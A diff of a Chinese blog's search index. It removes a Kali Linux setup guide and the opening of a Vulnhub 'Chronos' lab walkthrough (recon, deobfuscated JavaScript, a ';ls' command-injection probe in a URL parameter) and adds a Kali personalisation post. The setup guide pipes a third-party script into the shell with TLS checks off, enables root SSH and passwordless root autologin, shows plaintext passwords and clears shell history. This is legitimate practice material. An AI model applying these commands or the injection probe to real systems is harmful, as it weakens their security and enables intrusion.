-<li>参考地址：<a href="https://www.mintimate.cn/2021/02/05/configZsh/">https://www.mintimate.cn/2021/02/05/configZsh/</a></li>
-<li>官方脚本：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains sh -c &quot;$(curl -kfsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>大佬的脚本：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zsh -c &quot;$(curl -kfsSL &#x27;https://api.host.mintimate.cn/fileHost/public/download/1P0R&#x27;)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">proxychains wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh</span></span><br><span class="line">proxychains zsh install.sh</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>关闭自动转义，更换皮肤：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf ~/zshrcBak &amp;&amp; sed -i &quot;11i\PROMPT_EOL_MARK=&#x27;&#x27;&quot; ~/.zshrc &amp;&amp; sed -i &quot;11i\DISABLE_MAGIC_FUNCTIONS=true&quot; ~/.zshrc &amp;&amp; sed -i &#x27;s/robbyrussell/steeef/&#x27; ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>安装插件：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions &amp;&amp; proxychains git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting &amp;&amp; proxychains git clone https://github.com/wting/autojump.git</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>加载插件：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">        git</span><br><span class="line">        zsh-autosuggestions</span><br><span class="line">        zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>安装插件：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/wting/autojump.git ; cd autojump ; ./install.py ; echo &#x27;[[ -s /root/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; source /root/.autojump/etc/profile.d/autojump.sh&#x27; &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
-<h3 id="中断设置"><a href="#中断设置" class="headerlink" title="中断设置"></a>中断设置</h3><ul>
-<li>由于 Ctrl+C 和中断命令冲突，修改一下中断的快捷键：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;stty intr &quot;^b&quot;&quot; &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
-<h3 id="装逼-neofetch"><a href="#装逼-neofetch" class="headerlink" title="装逼 neofetch"></a>装逼 neofetch</h3><ul>
-<li>安装一下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install neofetch -y</span><br></pre></td></tr></table></figure>
-<h2 id="桌面美化"><a href="#桌面美化" class="headerlink" title="桌面美化"></a>桌面美化</h2><h3 id="桌面壁纸"><a href="#桌面壁纸" class="headerlink" title="桌面壁纸"></a>桌面壁纸</h3><ul>
-<li>右键桌面设置 -&gt; 目录 -&gt; 选择你的图片目录即可。</li>
-</ul>
-<h3 id="图标整理"><a href="#图标整理" class="headerlink" title="图标整理"></a>图标整理</h3><ul>
-<li>右键桌面设置 -&gt; 图标 -&gt; 取消默认图标。</li>
-</ul>
-<h3 id="任务栏调整"><a href="#任务栏调整" class="headerlink" title="任务栏调整"></a>任务栏调整</h3><ul>
-<li>右键任务栏 -&gt; 面板 -&gt; 面板首选项 -&gt; 锁定面板 -&gt; 拖拽任务栏至最下方 -&gt; 锁定面板 -&gt; 对于不需要的图标进行 remove 即可 -&gt; 时间修改为 24 小时制（时区）</li>
-</ul>
-<h3 id="外观改变"><a href="#外观改变" class="headerlink" title="外观改变"></a>外观改变</h3><ul>
-<li>外观 -&gt; 样式 -&gt; Adwaite-dark</li>
-</ul>
-<h3 id="文件夹显示"><a href="#文件夹显示" class="headerlink" title="文件夹显示"></a>文件夹显示</h3><ul>
-<li>打开文件夹 -&gt; 视图 -&gt; 列表视图 -&gt; 按所需放大</li>
-</ul>
-<h3 id="电源管理"><a href="#电源管理" class="headerlink" title="电源管理"></a>电源管理</h3><ul>
-<li>右键应用程序 -&gt; 设置 -&gt; 电源管理器 -&gt; 显示 -&gt; 将使用电池和插入电源三个选项全部调成从不即可。</li>
-</ul>
-<h3 id="锁屏修改"><a href="#锁屏修改" class="headerlink" title="锁屏修改"></a>锁屏修改</h3><ul>
-<li>设置 -&gt; LightDM 桌面管理器 -&gt; 背景 -&gt; 进入&#x2F;usr&#x2F;share&#x2F;backgrounds&#x2F;kali -&gt; 选取一个（自定义图片会报错，我选 cubism）</li>
-</ul>
-<h3 id="自动登录（建议不用）"><a href="#自动登录（建议不用）" class="headerlink" title="自动登录（建议不用）"></a>自动登录（建议不用）</h3><ul>
-<li>首先是因为锁屏界面太丑了，改了还黑屏，那干脆去掉登录这个步骤，命令如下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/lightdm/lightdm.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[S</span></span><br><span class="line">autologin-user=root</span><br><span class="line">autologin-user-timeout=0</span><br><span class="line"></span><br><span class="line">sudo vim /etc/pam.d/lightdm-autologin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注释掉如下内容</span></span><br><span class="line">auth required pam_succeed_if.so user != root quiet_success</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启</span></span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure>
-<h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><ul>
-<li>输入如下命令即可：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable ssh ; echo &quot;PermitRootLogin yes&quot; &gt;&gt; /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
-
-<h2 id="firefox"><a href="#firefox" class="headerlink" title="firefox"></a>firefox</h2><ul>
-<li>登入账户，自动同步即可。</li>
-<li>部分还是需要手动整理。</li>
-</ul>
-<h2 id="多版本-Java-共存"><a href="#多版本-Java-共存" class="headerlink" title="多版本 Java 共存"></a>多版本 Java 共存</h2><ul>
-<li>Kali 2023 默认 Java 版本是：openjdk 17，版本有点高会导致一些工具无法使用。</li>
-<li>下载 <code>jdk-8u301-linux-x64.tar.gz</code> 安装包，而后进行如下操作：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/Desktop/kali/jdk-8u301-linux-x64.tar.gz /usr/lib/jvm ; cd /usr/lib/jvm ; tar zxvf jdk-8u301-linux-x64.tar.gz ; rm -rf jdk-8u301-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用 <code>update-alternatives</code> 注册服务：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_301/bin/java 1 ; update-alternatives --config java</span><br></pre></td></tr></table></figure>
-<h2 id="工具安装-1"><a href="#工具安装-1" class="headerlink" title="工具安装"></a>工具安装</h2><ul>
-<li>命令如下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install dirsearch feroxbuster lrzsz -y;</span><br></pre></td></tr></table></figure>
-
-<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><ul>
-<li>命令如下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl  -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - ; echo &#x27;deb https://download.docker.com/linux/debian stretch stable&#x27;&gt; /etc/apt/sources.list.d/docker.list ; apt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-common -y; apt install docker.io -y; apt install docker-compose -y</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仓库源</span></span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [&quot;https://y5u7p3c7.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启docker</span></span><br><span class="line">systemctl daemon-reload ; systemctl restart docker</span><br></pre></td></tr></table></figure>
-<h3 id="Viper"><a href="#Viper" class="headerlink" title="Viper"></a>Viper</h3><ul>
-<li>创建文件夹：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p ~/tools/viper;cd ~/tools/viper</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>创建docker-compose.yml文件，其中command后面跟着的是密码：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tee docker-compose.yml &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">version: &quot;3&quot;</span><br><span class="line">services:</span><br><span class="line">  viper:</span><br><span class="line">    image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest</span><br><span class="line">    container_name: viper-c</span><br><span class="line">    network_mode: &quot;host&quot;</span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">      - ~/tools/viper/loot:/root/.msf4/loot</span><br><span class="line">      - ~/tools/viper/db:/root/viper/Docker/db</span><br><span class="line">      - ~/tools/viper/module:/root/viper/Docker/module</span><br><span class="line">      - ~/tools/viper/log:/root/viper/Docker/log</span><br><span class="line">      - ~/tools/viper/nginxconfig:/root/viper/Docker/nginxconfig</span><br><span class="line">    command: [&quot;admin@123&quot;]</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>写个快速启动脚本：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">viper-yes</span></span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line">cd ~/tools/viper ; sudo docker-compose up -d &gt; /dev/null</span><br><span class="line">echo &quot;Success Start Viper!&quot;</span><br><span class="line">echo &quot;Username:root - Password:admin@123&quot;</span><br><span class="line">echo &quot;Login Page:https://127.0.0.1:60000&quot;</span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line">sudo docker ps</span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">viper-no</span></span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line">cd ~/tools/viper ; sudo docker-compose down &gt; /dev/null</span><br><span class="line">echo &quot;Success Remove Vpier!&quot;</span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line">sudo docker ps -a</span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>把所用命令给个权限：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod -R +x ~/tools/* ; source ~/.zshrc</span><br></pre></td></tr></table></figure>
-<h2 id="xrdp"><a href="#xrdp" class="headerlink" title="xrdp"></a>xrdp</h2><ul>
-<li>有时候需要使用 windows 连接到 Kali，命令如下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装程序</span></span><br><span class="line">apt-get -y install kali-desktop-xfce xorg xrdp -y ; sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini ; systemctl start xrdp ; systemctl enable xrdp</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>需要注意 xrdp 和 Windows 一样，同一时间只有一个用户能够登录，不然会闪退。</li>
-<li>由于设置了自动登录，需要先注销当前登录，但是 xrdp 登录后，root 的图像化就登不上了。</li>
-</ul>
-<h2 id="marktext"><a href="#marktext" class="headerlink" title="marktext"></a>marktext</h2><ul>
-<li>安装命令如下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/Desktop/kali ; dpkg -i marktext-amd64.deb </span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>修改快捷启动方式，在后面添加：<code>--no-sandbox</code></li>
-</ul>
-<h1 id="清理动作"><a href="#清理动作" class="headerlink" title="清理动作"></a>清理动作</h1><ul>
-<li>删除历史信息：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;&quot; &gt; ~/.zsh_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看执行路径：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>备注信息：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Origin</span></span><br><span class="line">kali-linux-2023.2-vmware-amd64</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User</span></span><br><span class="line">User/Passwd：kali/yongz</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Change</span></span><br><span class="line">Language：zh_CN.UTF-8</span><br><span class="line">keyboard：fcitx</span><br><span class="line">SSH enabled：root login</span><br><span class="line">sources.list：(aliyun)</span><br><span class="line">Terminal：oh-my-zsh</span><br><span class="line">Copy：Ctrl+B</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - -</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Software</span></span><br><span class="line">dirsearch</span><br><span class="line">feroxbuster(seclists)</span><br><span class="line">Qv2ray</span><br><span class="line">java1.8</span><br><span class="line">docker：</span><br><span class="line">	Viper</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - -</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Creation Time</span></span><br><span class="line">2023.07.31</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Kali</tag>
+        <tag>摸爬滚打</tag>
       </tags>
   </entry>
   <entry>
@@ -2535,199 +2451,283 @@
       </tags>
   </entry>
   <entry>
-    <title>Chronos</title>
-    <url>/2023/01/07/Vulnhub_Kali/03.Chronos_20230107/</url>
+    <title>Kali 个性化配置</title>
+    <url>/2023/06/25/Linux/Kali/Kali%20%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE_20230625/</url>
     <content><![CDATA[<ul>
-<li>Vulnhub_Kali 填坑系列（三）启动，总体难度不大，问题是怎么找到 EJS 的漏洞。</li>
-<li>靶机地址：<a href="https://www.vulnhub.com/entry/chronos-1,735/">https://www.vulnhub.com/entry/chronos-1,735/</a></li>
-<li>Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶机桥接吧。</li>
-</ul>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul>
-<li>由于将 Kali 与 VulnHub 使用 Virtual Box 仅主机网卡进行了桥接，所以使用 Kali 去扫描靶机。</li>
-<li>首先查看 Kali IP 地址：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::adc5:106b:ff3c:9390  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a8:8a:0b  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 24  bytes 10921 (10.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 549  bytes 40698 (39.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>扫描当前网段，发现靶机 IP 地址：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan 192.168.56.0/24</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:a8:8a:0b, IPv4: 192.168.56.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:ea:40:88       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.108  08:00:27:58:b9:2b       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.991 seconds (128.58 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>继续使用 Nmap 扫描端口、开放服务等信息：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.56.108</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 05:57 EST</span><br><span class="line">Nmap scan report for 192.168.56.108</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8000/tcp open  http-alt</span><br><span class="line">MAC Address: 08:00:27:58:B9:2B (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p 22,80,8000 -sV 192.168.56.108</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-07 05:58 EST</span><br><span class="line">Nmap scan report for 192.168.56.108</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">8000/tcp open  http    Node.js Express framework</span><br><span class="line">MAC Address: 08:00:27:58:B9:2B (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.78 seconds</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>扫描出 8080 端口的 Web 服务，通常情况下不考虑 SSH 爆破，访问一下 Web 服务：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830224831447.png" alt="image-20230830224831447"></p>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830224837584.png" alt="image-20230830224837584"></p>
-<h1 id="源码解码"><a href="#源码解码" class="headerlink" title="源码解码"></a>源码解码</h1><ul>
-<li>两个端口的 Web 服务都非常简单，查看一下页面的源码，发现一段不一样的代码：</li>
-</ul>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5bdf=[<span class="string">&#x27;150447srWefj&#x27;</span>,<span class="string">&#x27;70lwLrol&#x27;</span>,<span class="string">&#x27;1658165LmcNig&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;1260881JUqdKM&#x27;</span>,<span class="string">&#x27;10737CrnEEe&#x27;</span>,<span class="string">&#x27;2SjTdWC&#x27;</span>,<span class="string">&#x27;readyState&#x27;</span>,<span class="string">&#x27;responseText&#x27;</span>,<span class="string">&#x27;1278676qXleJg&#x27;</span>,<span class="string">&#x27;797116soVTES&#x27;</span>,<span class="string">&#x27;onreadystatechange&#x27;</span>,<span class="string">&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;</span>,<span class="string">&#x27;User-Agent&#x27;</span>,<span class="string">&#x27;status&#x27;</span>,<span class="string">&#x27;1DYOODT&#x27;</span>,<span class="string">&#x27;400909Mbbcfr&#x27;</span>,<span class="string">&#x27;Chronos&#x27;</span>,<span class="string">&#x27;2QRBPWS&#x27;</span>,<span class="string">&#x27;getElementById&#x27;</span>,<span class="string">&#x27;innerHTML&#x27;</span>,<span class="string">&#x27;date&#x27;</span>];(<span class="keyword">function</span>(<span class="params">_0x506b95,_0x817e36</span>)&#123;<span class="keyword">var</span> _0x244260=_0x432d;<span class="keyword">while</span>(!![])&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x35824b=-<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x7e</span>))*<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x90</span>))+<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x8e</span>))+<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x7f</span>))*<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x83</span>))+-<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x87</span>))+-<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x82</span>))*<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x8d</span>))+-<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x88</span>))+<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x80</span>))*<span class="built_in">parseInt</span>(<span class="title function_">_0x244260</span>(<span class="number">0x84</span>));<span class="keyword">if</span>(_0x35824b===_0x817e36)<span class="keyword">break</span>;<span class="keyword">else</span> _0x506b95[<span class="string">&#x27;push&#x27;</span>](_0x506b95[<span class="string">&#x27;shift&#x27;</span>]());&#125;<span class="keyword">catch</span>(_0x3fb1dc)&#123;_0x506b95[<span class="string">&#x27;push&#x27;</span>](_0x506b95[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x5bdf,<span class="number">0xcaf1e</span>));<span class="keyword">function</span> <span class="title function_">_0x432d</span>(<span class="params">_0x16bd66,_0x33ffa9</span>)&#123;<span class="keyword">return</span> _0x432d=<span class="keyword">function</span>(<span class="params">_0x5bdf82,_0x432dc8</span>)&#123;_0x5bdf82=_0x5bdf82-<span class="number">0x7e</span>;<span class="keyword">var</span> _0x4da6e8=_0x5bdf[_0x5bdf82];<span class="keyword">return</span> _0x4da6e8;&#125;,<span class="title function_">_0x432d</span>(_0x16bd66,_0x33ffa9);&#125;<span class="keyword">function</span> <span class="title function_">loadDoc</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x17df92=_0x432d,_0x1cff55=<span class="title function_">_0x17df92</span>(<span class="number">0x8f</span>),_0x2beb35=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();_0x2beb35[<span class="title function_">_0x17df92</span>(<span class="number">0x89</span>)]=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x146f5d=_0x17df92;<span class="variable language_">this</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x85</span>)]==<span class="number">0x4</span>&amp;&amp;<span class="variable language_">this</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x8c</span>)]==<span class="number">0xc8</span>&amp;&amp;(<span class="variable language_">document</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x91</span>)](<span class="title function_">_0x146f5d</span>(<span class="number">0x93</span>))[<span class="title function_">_0x146f5d</span>(<span class="number">0x92</span>)]=<span class="variable language_">this</span>[<span class="title function_">_0x146f5d</span>(<span class="number">0x86</span>)]);&#125;,_0x2beb35[<span class="title function_">_0x17df92</span>(<span class="number">0x81</span>)](<span class="string">&#x27;GET&#x27;</span>,<span class="title function_">_0x17df92</span>(<span class="number">0x8a</span>),!![]),_0x2beb35[<span class="string">&#x27;setRequestHeader&#x27;</span>](<span class="title function_">_0x17df92</span>(<span class="number">0x8b</span>),_0x1cff55),_0x2beb35[<span class="string">&#x27;send&#x27;</span>]();&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830224919868.png" alt="image-20230830224919868"></p>
-<ul>
-<li>由于是出现在 <code>&lt;script&gt;</code>标签中的，所以可以认定是 JavaScript 代码，但是看代码内容像是被加密过，需要解密，由于不知道使用的加密方式，选择一个在线网站进行解密。<ul>
-<li>CyberChef： <a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></li>
-</ul>
+<li><p>由于个人强迫症的原因，Kali原版用不太习惯，这里就进行简单的美化和应用安装。</p>
+</li>
+<li><p>版本来源：官网上新版本的 vmware 解压使用版，这里以 <code>kali-linux-2023.2-vmware-amd64</code> 为例。</p>
 </li>
 </ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830224942852.png" alt="image-20230830224942852"></p>
-<ul>
-<li>根据上述步骤，可以将代码进行解密，解密完后，发现一个网址：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将 format 后面的字符串进行解密（base 58）：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830225002872.png" alt="image-20230830225002872"></p>
-<ul>
-<li>发现表示的是日期时间，说明上述 URL 的作用很有可能是向 chronos.local 地址发送时间信息。</li>
-</ul>
-<h1 id="Host-修改"><a href="#Host-修改" class="headerlink" title="Host 修改"></a>Host 修改</h1><ul>
-<li>由于是 8000 端口，有理由怀疑就是指向靶机。需要修改本地 DNS 文件，将 chronos.local 域名指向靶机：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"></span><br><span class="line">192.168.56.108 chronos.local</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>再次访问 Web 服务：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830225118030.png" alt="image-20230830225118030"></p>
-<ul>
-<li>多了一行时间信息，好像还是没啥用，BurpSuite 抓包看看：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830225130853.png" alt="image-20230830225130853"></p>
-<ul>
-<li><p>发现有 3 个 URL 请求信息。第一个是正常访问，第二个是 Options 访问，第三个是 Get 请求。</p>
-<ul>
-<li>注：Options 通常是浏览器自动发起的，目的就是去服务器检查一下接下来要到用的方法（ GET、POST、PUT、detele）在服务器上是否支持；</li>
+<h1 id="简单美化"><a href="#简单美化" class="headerlink" title="简单美化"></a>简单美化</h1><h2 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h2><ul>
+<li>点击编辑虚拟机配置，添加2张网卡： <ul>
+<li>网络适配器：桥接</li>
+<li>网络适配器2：NAT</li>
+<li>网络适配器3：VMnet 1</li>
 </ul>
 </li>
+<li>如果用不到 NAT 和 VMnet 1，临时禁用这两张网卡：</li>
 </ul>
-<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><ul>
-<li>这里发现一个问题，在 format 跟着 base58 的时间请求，在页面上进行了显示：</li>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ifconfig eth1 down</span><br><span class="line">sudo ifconfig eth2 down</span><br></pre></td></tr></table></figure>
+<h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><ul>
+<li>设置 root 密码：</li>
 </ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231227045.png" alt="image-20230830231227045"></p>
-<ul>
-<li>那这里是否有可能存在命令执行？抱着这个疑问，去尝试一下，将 <code>;ls base58</code> 一下：</li>
-</ul>
